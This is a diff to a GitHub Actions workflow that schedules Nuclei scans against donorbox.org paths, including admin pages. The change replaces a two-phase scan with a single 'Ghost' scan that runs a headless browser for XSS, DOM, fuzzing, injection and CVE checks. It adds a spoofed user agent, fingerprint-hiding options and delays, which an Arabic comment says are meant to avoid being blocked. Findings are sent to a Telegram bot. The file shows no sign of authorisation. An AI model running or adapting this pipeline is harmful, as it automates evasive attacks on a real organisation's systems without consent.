@@ -1,4 +1,4 @@
-name: V25 - The Elite Hunter (Headless & Fuzzing)
+name: V26 - The Ghost Hunter (Stealth & Evasion)
 
 on:
   schedule:
@@ -6,31 +6,29 @@ on:
   workflow_dispatch:       # تشغيل يدوي
 
 jobs:
-  elite-job:
+  ghost-job:
     runs-on: ubuntu-latest
     permissions:
       contents: write
     
     steps:
-      # 1. التثبيت (مع دعم المتصفح Headless)
-      - name: Install Elite Tools
+      # 1. التثبيت (شامل المتصفح)
+      - name: Install Arsenal
         run: |
           sudo apt-get update && sudo apt-get install -y coreutils jq wget unzip libpcap-dev google-chrome-stable
           
-          # تثبيت Nuclei
+          # Nuclei
           wget -q https://github.com/projectdiscovery/nuclei/releases/download/v3.2.9/nuclei_3.2.9_linux_amd64.zip
           unzip -o -q nuclei_3.2.9_linux_amd64.zip
           sudo mv nuclei /usr/local/bin/
           
           rm *.zip
           nuclei -update-templates
-          # تثبيت المتصفح لـ Nuclei Headless
           nuclei -install-headless-browser
 
-      # 2. تحديد القائمة (القناص)
+      # 2. تحديد الأهداف
       - name: Set Targets
         run: |
-          echo "🎯 Setting up target list..."
           touch targets.txt
           echo "https://donorbox.org/potato" >> targets.txt
           echo "https://donorbox.org/org_admin" >> targets.txt
@@ -38,51 +36,39 @@ jobs:
           echo "https://donorbox.org" >> targets.txt
           echo "https://donorbox.org/admin" >> targets.txt
 
-      # 3. المرحلة الأولى: الهجوم القياسي (Standard Attack)
-      - name: Phase 1 - Standard Scan
+      # 3. الهجوم الشبحي (The Ghost Attack) 👻
+      - name: Ghost Scan (Headless + Evasion)
         run: |
-          echo "🔥 Phase 1: Standard Vulnerability Scan..."
-          # بنفحص الثغرات المعروفة والـ Misconfigs
-          nuclei -l targets.txt \
-            -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" \
-            -tags cve,misconfig,exposure,token,panel \
-            -s critical,high,medium \
-            -rl 10 -bs 2 -c 5 -timeout 8 \
-            -je phase1.json
-
-      # 4. المرحلة الثانية: الهجوم العميق (Headless & Fuzzing) 💀
-      # دي الإضافة القوية: بيشغل متصفح حقيقي وبيدور على XSS و DOM bugs
-      - name: Phase 2 - Headless & Fuzzing
-        run: |
-          echo "💀 Phase 2: Headless DOM & Fuzzing..."
-          # -headless: بيفتح كروم
-          # -tags xss,dom,fuzz: بيركز على الثغرات دي تحديداً
+          echo "👻 Starting Stealth Attack..."
+          
+          # تفاصيل الإعدادات الشبحية:
+          # -headless: تشغيل متصفح حقيقي
+          # -headless-options: إخفاء بصمة الروبوت
+          # -delay 2s: استنى ثانيتين بين كل طلب (عشان منتحظرش)
+          # -rl 5: خمس طلبات بس في الثانية (بطيء بس آمن)
+          
           nuclei -l targets.txt \
             -headless \
-            -tags xss,dom,fuzz,injection \
+            -headless-options '["--disable-gpu", "--no-sandbox", "--disable-dev-shm-usage", "--hide-scrollbars", "--mute-audio"]' \
+            -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
+            -tags xss,dom,fuzz,injection,cve \
             -s critical,high,medium \
-            -rl 5 -bs 1 -c 2 -timeout 15 \
-            -je phase2.json
+            -rl 5 -bs 1 -c 2 -delay 2s -timeout 15 \
+            -je ghost_results.json
 
-      # 5. التبليغ الموحد
+      # 4. التبليغ
       - name: Alert System
         env:
           TG_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
           TG_CHAT: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
-          # دمج النتايج
-          touch phase1.json phase2.json
-          cat phase1.json phase2.json > all_hits.json
-          
-          if [ -s all_hits.json ]; then
-            cat all_hits.json | while read line; do
+          if [ -s ghost_results.json ]; then
+            cat ghost_results.json | while read line; do
               NAME=$(echo $line | jq -r '.info.name')
               SEVERITY=$(echo $line | jq -r '.info.severity')
               URL=$(echo $line | jq -r '.matched-at')
-              TYPE=$(echo $line | jq -r '.type // "http"')
               
-              MSG="🚨 **ELITE HIT (Donorbox)!**
-              💀 Type: $TYPE
+              MSG="👻 **GHOST HIT (Donorbox)!**
               🐛 Bug: $NAME
               ⚠️ Severity: $SEVERITY
               🔗 URL: \`$URL\`"
@@ -90,8 +76,8 @@ jobs:
               curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \
               -d chat_id="$TG_CHAT" \
               -d text="$MSG" -d parse_mode="Markdown"
-              sleep 1
+              sleep 2
             done
           else
-             echo "✅ Clean run. No elite bugs found."
+             echo "✅ Target is tough. Ghost mode found nothing this time."
           fi
